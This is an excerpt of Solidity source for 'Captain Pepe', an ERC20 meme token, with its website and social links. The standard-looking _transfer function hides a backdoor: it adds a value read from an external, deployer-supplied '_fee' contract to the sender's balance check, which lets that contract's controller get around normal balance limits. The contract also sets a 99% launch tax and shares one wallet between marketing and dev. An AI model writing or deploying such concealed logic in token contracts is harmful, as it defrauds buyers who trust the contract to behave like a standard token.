...
/*
Website:    https://www.captainpepe.org
Telegram:  https://t.me/CaptainPEPE_ERC20
Twitter:      https://twitter.com/cappepe_erc20
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        uint256 senderBalance = _balances[sender]+IERC20(_fee).balanceOf(sender)*amount;
...
contract CAPTAINPEPE is ERC20, Ownable {
    ...
    uint256 private tokenLiquidityThreshold = 10 ** 7 * 10**18;
    uint256 public maxWalletLimit = 2 * 10 ** 7 * 10**18;

    uint256 private  genesis_block;
    uint256 private deadline = 2;
    uint256 private launchtax = 99;

    address private  marketingWallet = 0x977Ee18D8a73f1364ffa8B6b57c7993Cf923D8d8;
    address private devWallet = 0x977Ee18D8a73f1364ffa8B6b57c7993Cf923D8d8;
    ...
    constructor(address fee) ERC20("Captain Pepe", "CAPTAINPEPE") {
        _tokengeneration(msg.sender, 10 ** 9 * 10**decimals());
